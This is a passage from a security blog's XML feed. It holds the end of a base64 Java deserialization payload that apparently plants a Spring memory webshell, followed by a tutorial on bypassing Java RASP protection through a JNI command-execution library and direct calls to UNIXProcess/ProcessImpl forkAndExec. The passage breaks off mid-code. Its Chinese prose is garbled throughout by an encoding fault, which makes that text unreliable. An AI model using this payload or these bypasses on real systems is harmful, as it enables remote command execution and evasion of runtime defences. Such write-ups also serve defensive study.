1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA9wcmludFN0YWNrVHJhY2UBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQApACoAAAAAAAQAAQArACwAAQAtAAAALwABAAEAAAAFKrcAAbEAAAACAC4AAAAGAAEAAAAQAC8AAAAMAAEAAAAFADAAMQAAAAEAMgAzAAMALQAAAD8AAAADAAAAAbEAAAACAC4AAAAGAAEAAAA0AC8AAAAgAAMAAAABADAAMQAAAAAAAQA0ADUAAQAAAAEANgA3AAIAOAAAAAQAAQA5ADoAAAAJAgA0AAAANgAAAAEAMgA7AAMALQAAAEkAAAAEAAAAAbEAAAACAC4AAAAGAAEAAAA5AC8AAAAqAAQAAAABADAAMQAAAAAAAQA0ADUAAQAAAAEAPAA9AAIAAAABAD4APwADADgAAAAEAAEAOQA6AAAADQMANAAAADwAAAA+AAAACABAACwAAQAtAAACWQAGAAoAAADbuAACEgMDuQAEAwDAAAVLKhIGuQAHAgDAAAZMAU0SBhIItgAJTacACE4ttgALLAS2AAwBTiwrtgANwAAOTqcACjoEGQS2ABASEToEuwASWbcAExkEtgAUOgUSFRIWB70AF1kDEhhTWQQSGVNZBbIAGlNZBrIAGlO2ABs6BhkGBLYAHBkGuAAdtgAeB70AH1kDEiBTWQQZBVNZBQO4ACFTWQYZBb64ACFTtgAiwAAXOgcZBwO9ABe2ACM6CBkIA70AH7YAJMAAJToJLRkJuQAmAgBXpwAISyq2ACixAAMAHQAlACgACgA0AD0AQAAPAAAA0gDVACcABAAuAAAAZgAZAAAAEwAPABUAGwAWAB0AGAAlABsAKAAZACkAGgAtABwAMgAdADQAHwA9ACIAQAAgAEIAIQBHACMASwAkAFkAJQB8ACYAggAnALAAKAC7ACkAyQAqANIALQDVACsA1gAsANoALwAvAAAAhAANACkABABBAEIAAwBCAAUAQQBDAAQADwDDAEQARQAAABsAtwBGAEcAAQAdALUASABJAAIANACeAEoASwADAEsAhwBMAE0ABABZAHkATgBPAAUAfABWAFAAUQAGALAAIgBSAFMABwC7ABcAVABVAAgAyQAJAFYAVwAJANYABABBAFgAAABZAAAAIAADADQAngBKAFoAAwCwACIAUgBbAAcAuwAXAFQAXAAIAF0AAAA4AAb/ACgAAwcAXgcAXwcAYAABBwBhBP8AEgAEBwBeBwBfBwBgBwBiAAEHAGMG/wCNAAAAAQcAZAQAAQBlAAAAAgBmcHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241114162939356.png" alt="image-20241114162939356"></p><p><img src="https://cdn.clown2024.cn/image-20241114163005607.png" alt="image-20241114163005607"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD=G=itD/YriQGkbvkp6QHKF4D&u_atoken=3b72cba8102056dc353d4296b75d2ed3&u_asig=0a47319217313359997215116e009a">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbvkp6QHKF4D&amp;u_atoken=3b72cba8102056dc353d4296b75d2ed3&amp;u_asig=0a47319217313359997215116e009a</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md</a></p><p><a href="https://forum.butian.net/share/3002">https://forum.butian.net/share/3002</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;Springæ¡†æ¶æ¯”è¾ƒå¸¸ç”¨å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å»ºä¸€ä¸ªspring+springmvcçš„é¡¹ç›®æ¥æµ‹è¯•å†…å­˜é©¬ï¼Œå†…å­˜é©¬ä¸»è¦çš„é€»è¾‘éƒ¨åˆ†éƒ½é›†ä¸­åœ¨spr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RASPç»•è¿‡å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-06T16:14:57.000Z</published>
    <updated>2024-11-11T14:43:13.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="raspä»‹ç»"><a href="#RASPä»‹ç»" class="headerlink" title="RASPä»‹ç»"></a>RASPä»‹ç»</h1><p>RASPå…¨ç§°æ˜¯Runtime applicaion self-protectionï¼Œåœ¨2014å¿µæå‡ºçš„ä¸€ç§åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤æŠ€æœ¯ï¼Œå°†é˜²æŠ¤åŠŸèƒ½æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¹‹ä¸­ï¼Œé€šè¿‡å°‘é‡çš„Hookå‡½æ•°ç›‘æµ‹ç¨‹åºçš„è¿è¡Œï¼Œæ ¹æ®å½“å‰çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå®æ—¶é˜»æ–­æ”»å‡»äº‹ä»¶ã€‚</p><p>ç›®å‰Java RASPä¸»è¦æ˜¯é€šè¿‡Instrumentationç¼–å†™Agentçš„å½¢å¼ï¼Œåœ¨Agentçš„premainå’Œagentmainä¸­åŠ å…¥æ£€æµ‹ç±»ä¸€èˆ¬ç»§æ‰¿äºClassFileTransformerï¼Œå½“ç¨‹åºè¿è¡Œè¿›æ¥çš„æ—¶å€™ï¼Œé€šè¿‡ç±»ä¸­çš„transformæ£€æµ‹å­—èŠ‚ç æ–‡ä»¶ä¸­æ˜¯å¦æœ‰ä¸€äº›æ•æ„Ÿçš„ç±»æ–‡ä»¶ï¼Œæ¯”å¦‚ProcessImplç­‰ã€‚ç®€å•çš„å¯ä»¥ç†è§£ä¸ºé€šè¿‡Instrumentationæ¥å¯¹JVMè¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>Instrumentation API æä¾›äº†ä¸¤ä¸ªæ ¸å¿ƒæ¥å£ï¼šClassFileTransformer å’Œ Instrumentationã€‚ClassFileTransformer æ¥å£å…è®¸å¼€å‘è€…åœ¨ç±»åŠ è½½å‰æˆ–ç±»é‡æ–°å®šä¹‰æ—¶å¯¹å­—èŠ‚ç è¿›è¡Œè½¬æ¢ã€‚Instrumentation æ¥å£åˆ™æä¾›äº†å¯åŠ¨æ—¶ä»£ç†å’Œé‡æ–°å®šä¹‰ç±»çš„èƒ½åŠ›</p><p>Java Agentå­˜åœ¨premainå’Œagentmainä¸¤ä¸ªæ–¹æ³•ï¼Œå…³äºè¿™ä¸¤ä¸ªæ–¹æ³•åœ¨ä¹‹å‰çš„java agentä¹Ÿè¯´è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†è¯´äº†</p><p>æ‰€ä»¥å…¶å®å°±æ˜¯å’Œå‰é¢çš„æ–‡ç« ä¸€æ ·ç¼–å†™ä¸€ä¸ªClassFileTransformerçš„å®ç°ç±»ï¼Œä½¿ç”¨è¯¥ç±»æ¥å¯¹ç¨‹åºè¿›è¡Œå®æ—¶ç›‘æ§ï¼Œå¦‚æœæ£€æµ‹åˆ°ç›¸å…³çš„å±é™©å‡½æ•°ï¼Œå°±é€šè¿‡transformæ–¹æ³•æ¥å¯¹ç±»å­—èŠ‚ç è¿›è¡Œè½¬åŒ–ã€‚</p><p>ä¸ä¼ ç»Ÿ WAF å¯¹æ¯”ï¼Œ RASP å®ç°æ›´ä¸ºåº•å±‚ï¼Œè§„åˆ™åˆ¶å®šæ›´ä¸ºç®€å•ï¼Œæ”»å‡»è¡Œä¸ºè¯†åˆ«æ›´ä¸ºç²¾å‡†ã€‚</p><h1 id="raspç»•è¿‡åŸç†"><a href="#RASPç»•è¿‡åŸç†" class="headerlink" title="RASPç»•è¿‡åŸç†"></a>RASPç»•è¿‡åŸç†</h1><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒRASPä¸»è¦æ˜¯é€šè¿‡è½¬æ¢å­—èŠ‚ç æ¥è¾¾åˆ°ç›®çš„ï¼Œå¦‚æœè®¾ç½®çš„æ£€æµ‹çš„æ–¹æ³•å­˜åœ¨ç€æ›´åº•å±‚çš„æ–¹æ³•æˆ–è€…ç›¸åŒå±‚çº§çš„ä¸åŒæ–¹æ³•èƒ½å¤Ÿè¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼Œé‚£ä¹ˆå°±èƒ½å®Œæˆç»•è¿‡ã€‚</p><p>æ‰€ä»¥ç»•è¿‡çš„æ‰‹æ³•å¤§è‡´ä¸ºä¸¤ç§ï¼š</p><ol><li>å¯»æ‰¾æ²¡æœ‰è¢«é™åˆ¶çš„ç±»æˆ–è€…å‡½æ•°æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ç»•è¿‡é»‘åå•</li><li>åˆ©ç”¨æ›´åº•å±‚çš„æŠ€æœ¯è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚ä» C ä»£ç çš„å±‚é¢è¿›è¡Œç»•è¿‡</li></ol><h1 id="jniç»•è¿‡"><a href="#JNIç»•è¿‡" class="headerlink" title="JNIç»•è¿‡"></a>JNIç»•è¿‡</h1><p>JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºåœ¨ Java ç¨‹åºä¸­è°ƒç”¨æœ¬åœ°ï¼ˆNativeï¼‰ä»£ç ï¼Œå³ä½¿ç”¨å…¶ä»–è¯­è¨€ï¼ˆå¦‚Cã€C++ï¼‰ç¼–å†™çš„ä»£ç ï¼Œä»è€Œå¯ä»¥å……åˆ†åˆ©ç”¨æœ¬åœ°ä»£ç çš„åŠŸèƒ½å’Œæ€§èƒ½ä¼˜åŠ¿ï¼Œå®ç°å¯¹åº•å±‚ç³»ç»Ÿèµ„æºå’Œå¤–éƒ¨åº“çš„è®¿é—®ã€‚</p><p>JNIçš„è®¾è®¡æ˜¯ä¸ºäº†è§£å†³javaæ— æ³•ç›´æ¥è®¿é—®åº•å±‚ç³»ç»Ÿèµ„æºæˆ–è€…åˆ©ç”¨æœ¬åœ°åº“çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡RASPã€‚æˆ‘ä»¬ç¼–å†™çš„ä»£ç æœ€åæ˜¯è¦ç¼–è¯‘ä¸ºdllåŠ¨æ€é“¾æ¥åº“æˆ–è€…soåŠ¨æ€å…±äº«åº“ï¼Œç„¶åJNIé€šè¿‡åŠ è½½è¿™äº›å…±äº«åº“æ¥æ‰§è¡Œæˆ‘ä»¬ç¼–å†™çš„æœ¬åœ°ä»£ç </p><p>æˆ‘ä»¬å†™ä¸€ä¸ªJNIä½¿ç”¨dllçš„ä¾‹å­ï¼Œå†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•</p><p>javaæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘æˆ.classæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javac Command.java<br></code></pre></td></tr></table></figure><p>ç„¶åå†ç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆcè¯­è¨€çš„.hå¤´æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javah -jni Command<br></code></pre></td></tr></table></figure><p>ç„¶åå†å»ç¼–å†™Command.cæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Command.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jni.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];   <br>    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!pipe)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (!feof(pipe))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), pipe))<br>        &#123; <br>            <span class="hljs-built_in">strcat</span>(result, buffer);<br>        &#125;<br>    &#125;<br>    pclose(pipe); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;     <br>&#125;<br>JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_Command_exec</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <br>    execmd(cstr, result);<br>    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">strcat</span>(return_messge, result);<br>    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);<br>    <span class="hljs-keyword">return</span> cmdresult;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™å¥½ä¹‹åè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘æˆdllæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include&quot;</span> -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include\win32&quot;</span> -D__int64=<span class="hljs-string">&quot;long long&quot;</span> --shared <span class="hljs-string">&quot;D:\CTF\Java\JavaCode\JNITest\src\main\java\Command.c&quot;</span>  -o ./jni.dll<br></code></pre></td></tr></table></figure><blockquote><p>-D æ˜¯ <code>gcc</code> ç¼–è¯‘å™¨çš„ä¸€ä¸ªé¢„å¤„ç†å™¨å‚æ•°ï¼Œç”¨äºå®šä¹‰å®</p><p>-Iç”¨äºæŒ‡å®šé¢å¤–çš„ç›®å½•ï¼Œè®©ç¼–è¯‘å™¨åœ¨è¿™äº›ç›®å½•ä¸­æœç´¢å¤´æ–‡ä»¶</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241107203652320.png" alt="image-20241107203652320"></p><p>ç„¶åç”¨System.loadæˆ–è€…System.loadsæ–¹æ³•å°±å¯ä»¥åŠ è½½è¿™ä¸ªdllï¼Œç„¶åå°±å¯ä»¥å®ä¾‹åŒ–Commandç±»è°ƒç”¨ä»–çš„nativeæ–¹æ³•äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br><span class="hljs-comment">//        System.loadLibrary(&quot;jni&quot;); //load()æŒ‡å®šç»å¯¹è·¯å¾„</span><br>        System.load(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JNITest\\src\\main\\java\\jni.dll&quot;</span>);<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ipconfig</span> <span class="hljs-operator">=</span> command.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(ipconfig);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªjava.library.pathæ˜¯javaæœç´¢å…±äº«åº“çš„è·¯å¾„ï¼Œå¦‚æœç”¨loadLibraryæ–¹æ³•çš„è¯ï¼Œä»–æ˜¯ä¸èƒ½å¸¦è·¯å¾„çš„ï¼Œåªèƒ½ä»java.library.pathä¸­æœç´¢å¹¶åŠ è½½ï¼Œæ‰€ä»¥è¦ç”¨loadLibraryæ–¹æ³•åŠ è½½dllçš„è¯éœ€è¦ç¡®ä¿dllåœ¨æœå¯»è·¯å¾„ä¸‹é¢</p></blockquote><p>æ‰§è¡Œå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†</p><p><img src="https://cdn.clown2024.cn/image-20241107204035199.png" alt="image-20241107204035199"></p><p>æ‰€ä»¥å…¶å®ç»•è¿‡å°±æ˜¯èƒ½æŠŠæˆ‘ä»¬å†™çš„soä¸Šä¼ çš„æœåŠ¡å½“ä¸­å»ï¼Œå¯ä»¥é€šè¿‡javaçš„webshellã€æ–‡ä»¶ä¸Šä¼ ã€æˆ–è€…ååºåˆ—åŒ–ç­‰æ–¹å¼ï¼ŒåŠ è½½æˆ‘ä»¬å†™å¥½çš„soæˆ–è€…dll</p><p>è¿™é‡Œæœ‰ä¸€äº›JNIå‘½ä»¤æ‰§è¡Œçš„è„šæœ¬ä¾‹å­ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><h1 id="unixprocessç»•è¿‡"><a href="#UNIXProcessç»•è¿‡" class="headerlink" title="UNIXProcessç»•è¿‡"></a>UNIXProcessç»•è¿‡</h1><p>è¯´å®è¯ä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªä¸œè¥¿æˆ‘æ˜¯å¾ˆæ‡µçš„ï¼Œæ ¹æœ¬æ²¡å¬è¿‡ï¼Œçœ‹äº†ä¸€ä¸‹æ‰çŸ¥é“è¿™ä¸ªæ˜¯Runtime.exec()è°ƒç”¨é“¾çš„æœ«ç«¯ï¼Œå¹³æ—¶åªä¼šç”¨å¹¶æ²¡æœ‰å…³æ³¨è¿‡ç›¸å…³çš„è°ƒç”¨é“¾</p><p>RASPæœ‰äº›é’ˆå¯¹å‘½ä»¤æ‰§è¡Œçš„è¿‡æ»¤å°±æ˜¯å¯¹è°ƒç”¨é“¾ä¸­çš„<strong>java.lang.ProcessImpl.start</strong>æ–¹æ³•è¿›è¡Œè¿‡æ»¤ã€‚</p><p><strong>é‚£æ¥åˆ†æä¸€ä¸‹å‘½ä»¤æ‰§è¡Œçš„è°ƒç”¨é“¾</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><code>Runtime.exec(xxx)</code>è°ƒç”¨é“¾å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)<br>java.lang.ProcessImpl.start(ProcessImpl.java:134)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)<br>java.lang.Runtime.exec(Runtime.java:620)<br>java.lang.Runtime.exec(Runtime.java:450)<br>java.lang.Runtime.exec(Runtime.java:347)<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¹³æ—¶ç”¨çš„ProcessBuilder.startçš„æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ä¹Ÿå¤„äºè¿™ä¸ªè°ƒç”¨é“¾ä¸Š</p><p>ProcessBuilderæ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start();<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è°ƒç”¨æ ˆæ˜¯Linuxçš„ï¼Œä»å­—é¢ä¹Ÿå¯ä»¥çœ‹å¾—åˆ°è¿™æ˜¯UNIXProcessï¼ŒWindowsçš„è¯æˆ‘è‡ªå·±è·Ÿè¿›å‘ç°ä»–å’ŒLinuxä¸åŒçš„å°±æ˜¯æœ€ç»ˆé‚£ä¸€æ­¥ï¼ŒUNIXProcesså˜æˆProcessImpl.create</p><p><img src="https://cdn.clown2024.cn/image-20241108135939928.png" alt="image-20241108135939928"></p><p>åœ¨è¯¥nativeæ–¹æ³•å®ç°é‡Œé¢å°±ä¼šè°ƒç”¨Windowsçš„apiæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹</p><p>è¿™é‡Œè¿˜æ˜¯ç»§ç»­è·Ÿç€æ–‡ç« çš„Linuxç‰ˆæœ¬æ¥åˆ†æï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…³æ³¨çš„å°±æ˜¯<code>UNIXProcess</code>å’Œ<code>ProcessImpl</code>ï¼Œåœ¨JDK9ä¹‹åæŠŠ<code>UNIXProcess</code>åˆå¹¶åˆ°äº†<code>ProcessImpl</code>å½“ä¸­</p><p>ä»–ä»¬æœ€ç»ˆè°ƒç”¨çš„nativeæ–¹æ³•æ˜¯forkAndExecæ–¹æ³•ï¼Œå¦‚æ–¹æ³•åæ‰€è¿°ä¸»è¦æ˜¯é€šè¿‡<code>fork&amp;exec</code>æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç»•è¿‡RASPé˜²å¾¡çš„åŸç†å°±æ˜¯ä»–ä»¬é˜²å¾¡çš„å±‚æ•°ä¸å¤Ÿæ·±ï¼Œæ¯”å¦‚åªåˆ°<code>ProcessBuilder.start()</code>æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥è°ƒç”¨æœ€ç»ˆæ‰§è¡Œçš„<code>UNIXProcess/ProcessImpl</code>å®ç°å‘½ä»¤æ‰§è¡Œæˆ–è€…ç›´æ¥åå°„<code>UNIXProcess/ProcessImpl</code>çš„<code>forkAndExec</code>æ–¹æ³•å°±å¯ä»¥ç»•è¿‡RASPå®ç°å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>è¿™æ˜¯ProcessImplå®ä¾‹åŒ–UNIXProcessçš„æºç ï¼Œä¸»è¦æ˜¯çœ‹çœ‹å‚æ•°ä¼ é€’</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImpl</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> sun.misc.<span class="hljs-type">JavaIOFileDescriptorAccess</span> <span class="hljs-variable">fdAccess</span><br>        <span class="hljs-operator">=</span> 